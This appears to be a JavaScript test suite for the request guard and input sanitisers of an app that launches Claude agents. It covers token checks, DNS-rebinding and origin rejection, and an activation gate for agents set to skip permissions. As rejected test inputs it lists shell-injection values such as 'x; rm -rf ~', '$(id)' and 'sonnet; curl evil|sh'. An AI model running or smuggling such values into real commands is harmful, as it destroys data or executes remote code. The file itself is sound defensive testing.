import assert from 'node:assert/strict'
import { readFile } from 'node:fs/promises'
import { fileURLToPath } from 'node:url'
import { test } from 'node:test'
import { build } from 'vite'
import { allowedOrigins, createBackendGuard, createBackendToken, validHost } from '../server/request-guard.mjs'

const root = fileURLToPath(new URL('../', import.meta.url))
const result = await build({
  root, configFile: false, logLevel: 'silent',
  build: {
    write: false, minify: false,
    lib: { entry: `${root}tests/fixtures/phase6-entry.ts`, formats: ['es'] },
  },
})
const bundle = result[0].output.find(entry => entry.type === 'chunk' && entry.isEntry)
const phase6 = await import(`data:text/javascript;base64,${Buffer.from(bundle.code).toString('base64')}`)
const fork = JSON.parse(await readFile(`${root}fork.config.json`, 'utf8'))

const token = createBackendToken()
const guard = createBackendGuard({ port: fork.backendPort, token, origins: allowedOrigins(fork) })
const host = `127.0.0.1:${fork.backendPort}`
const request = (path, headers = {}, method = 'GET') => ({
  req: { method, headers: { host, ...headers } },
  url: new URL(path, 'http://localhost'),
})
const check = (path, headers, method) => {
  const { req, url } = request(path, headers, method)
  return guard.checkHttp(req, url)
}

test('web backend requires a fresh capability and rejects rebinding or foreign origins', () => {
  assert.match(token, /^[A-Za-z0-9_-]{43}$/)
  assert.notEqual(createBackendToken(), token)
  assert.equal(validHost(host, fork.backendPort), true)
  assert.equal(validHost(`evil.example:${fork.backendPort}`, fork.backendPort), false)

  assert.equal(check('/run', {}, 'POST').status, 401)
  assert.equal(check('/run', { 'x-ccanvas-token': 'x'.repeat(43) }, 'POST').status, 401)
  assert.equal(check('/run', { 'x-ccanvas-token': token }, 'POST').ok, true)
  assert.equal(check(`/file?path=/tmp/a&token=${token}`).ok, true)
  assert.equal(check('/run', { host: `attacker.test:${fork.backendPort}`, 'x-ccanvas-token': token }).status, 421)
  assert.equal(check('/run', { origin: 'https://evil.example', 'x-ccanvas-token': token }).status, 403)
  assert.equal(check('/run', { origin: 'null', 'x-ccanvas-token': token }).status, 403)
  assert.deepEqual(check('/health'), { ok: true, publicHealth: true })
  assert.equal(check('/health?token=wrong').status, 401)
})

test('CORS is reflected only to fork UI origins and WebSockets need origin plus token', () => {
  const ui = `http://127.0.0.1:${fork.devPort}`
  assert.equal(guard.corsHeaders(ui)['Access-Control-Allow-Origin'], ui)
  assert.equal(guard.corsHeaders('tauri://localhost')['Access-Control-Allow-Origin'], 'tauri://localhost')
  assert.equal(guard.corsHeaders('https://evil.example')['Access-Control-Allow-Origin'], undefined)

  const upgrade = (origin, suppliedToken, requestHost = host) => guard.checkUpgrade(
    { headers: { host: requestHost, ...(origin ? { origin } : {}) } },
    new URL(`/?cols=80${suppliedToken ? `&token=${suppliedToken}` : ''}`, 'http://localhost'),
  )
  assert.equal(upgrade(ui, token), true)
  assert.equal(upgrade(undefined, token), false)
  assert.equal(upgrade('https://evil.example', token), false)
  assert.equal(upgrade(ui, 'wrong'), false)
  assert.equal(upgrade(ui, token, `evil.test:${fork.backendPort}`), false)
})

test('proxy capability is separate from the command/file capability', async () => {
  const proxyToken = createBackendToken()
  const proxyGuard = createBackendGuard({ port: fork.backendPort, token: proxyToken, origins: allowedOrigins(fork) })
  const { req, url } = request(`/proxy?url=https://example.com&token=${proxyToken}`)
  assert.equal(proxyGuard.checkHttp(req, url).ok, true)
  assert.equal(check('/run', { 'x-ccanvas-token': proxyToken }, 'POST').status, 401)

  const server = await readFile(`${root}server/pty-server.mjs`, 'utf8')
  assert.doesNotMatch(server, /'Access-Control-Allow-Origin': '\*'/)
  assert.match(server, /url\.pathname === '\/proxy' \? proxyGuard : guard/)
  assert.match(server, /Content-Security-Policy': 'sandbox/)
  assert.match(server, /verifyClient: \(\{ req \}\) => guard\.checkUpgrade/)
  assert.match(server, /mode: 0o600/)
  const backend = await readFile(`${root}src/lib/backend.ts`, 'utf8')
  assert.match(backend, /withToken\(`\$\{BASE\}\/proxy\?url=\$\{encodeURIComponent\(target\)\}`, proxyToken\)/)
})

test('desktop media server routes sit behind a launch capability', async () => {
  const media = await readFile(`${root}src-tauri/src/media.rs`, 'utf8')
  assert.match(media, /\/m\/\{capability\}/)
  assert.match(media, /authorized_route\(path, capability\)/)
  assert.match(media, /capability_token\(\) else/)
})

test('Claude shell launch accepts only fixed-format document fields', () => {
  assert.equal(phase6.safeClaudeSessionId('123e4567-e89b-12d3-a456-426614174000'), '123e4567-e89b-12d3-a456-426614174000')
  for (const bad of ['x; rm -rf ~', '$(id)', '123e4567-e89b-12d3-a456-426614174000 --bad']) {
    assert.equal(phase6.safeClaudeSessionId(bad), undefined, bad)
  }
  assert.equal(phase6.safeClaudeModel('claude-sonnet-4.5'), 'claude-sonnet-4.5')
  assert.equal(phase6.safeClaudeModel('anthropic/claude:latest'), 'anthropic/claude:latest')
  for (const bad of ['sonnet; curl evil|sh', '$(id)', '-p', 'a b', 'x`y`']) {
    assert.equal(phase6.safeClaudeModel(bad), undefined, bad)
  }
  assert.equal(phase6.shellSafeTitle('a "$(id)" `x` \\ !\nnext'), 'a (id) x   next')
})

test('PTY paste strips controls so text cannot close paste or submit early', () => {
  assert.equal(phase6.ptySafeText('safe\r\nline\x1b[201~\rrun\u009b'), 'safe\nline[201~\nrun')
  assert.equal(phase6.ptyPaste('one line'), 'one line')
  assert.equal(phase6.ptyPaste('a\nb\x1b[201~\r'), '\x1b[200~a\nb[201~\n\x1b[201~')
})

test('opened documents with agents require activation and never persist that local flag', () => {
  const file = {
    format: 'ccnvs', version: 2, name: 'shared',
    elements: [{ id: 'a', type: 'widget', kind: 'agent', harness: 'claude', skipPermissions: true, x: 0, y: 0, w: 1, h: 1, z: 1, title: 'a' }],
  }
  const opened = phase6.fromFile(file, 'shared')
  assert.equal(opened.activationRequired, true)
  assert.equal('activationRequired' in phase6.toFile(opened), false)
  assert.equal(phase6.fromFile({ ...file, elements: [] }, 'empty').activationRequired, undefined)
})

test('agent widgets render an activation gate before launch', async () => {
  const frame = await readFile(`${root}src/widgets/WidgetFrame.tsx`, 'utf8')
  assert.match(frame, /el\.kind === 'agent' && activationRequired \? \(\n\s+<AgentActivationGate/)
  assert.match(frame, /requests Claude --dangerously-skip-permissions/)
  const app = await readFile(`${root}src/App.tsx`, 'utf8')
  assert.match(app, /<ActivationBar \/>/)
})
